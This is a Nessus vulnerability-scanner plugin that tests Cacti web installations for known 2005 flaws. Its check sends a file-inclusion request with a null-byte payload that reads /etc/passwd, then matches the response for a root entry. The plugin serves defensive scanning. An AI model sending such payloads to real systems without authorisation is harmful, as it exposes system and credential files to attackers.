#
# (C) Tenable Network Security
#


include("compat.inc");

if (description) {
  script_id(18546);
  script_version("$Revision: 1.13 $");

  script_cve_id("CVE-2005-1524", "CVE-2005-1525", "CVE-2005-1526");
  script_bugtraq_id(14027, 14028, 14030, 14042);
  script_xref(name:"OSVDB", value:"17424");
  script_xref(name:"OSVDB", value:"17425");
  script_xref(name:"OSVDB", value:"17539");

  script_name(english:"Cacti < 0.8.6e Multiple Vulnerabilities (SQLi, RFI)");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that suffers from
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Cacti, a web-based frontend to RRDTool for
network graphing. 

The version of Cacti on the remote host suffers from several
vulnerabilities that may allow an attacker to browse arbitrary files
on the affected system, execute arbitrary code from the affected or a
third-party system, and launch SQL injection attacks against the
affected site." );
 script_set_attribute(attribute:"see_also", value:"http://www.idefense.com/application/poi/display?id=265" );
 script_set_attribute(attribute:"see_also", value:"http://www.idefense.com/application/poi/display?id=266" );
 script_set_attribute(attribute:"see_also", value:"http://www.idefense.com/application/poi/display?id=267" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/403174/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Cacti 0.8.6e or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();

 
  summary["english"] = "Checks for multiple vulnerabilities in Cacti < 0.8.6e";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit one of the file include flaws.
  r = http_send_recv3(method:"GET", port: port, 
    item:string(dir, "/include/config_settings.php?",
      # nb: try to grab the password file.
      "config[include_path]=/etc/passwd%00"));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if we get the password file.
  if (egrep(string:res, pattern:"root:.+:0:[01]:")) {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
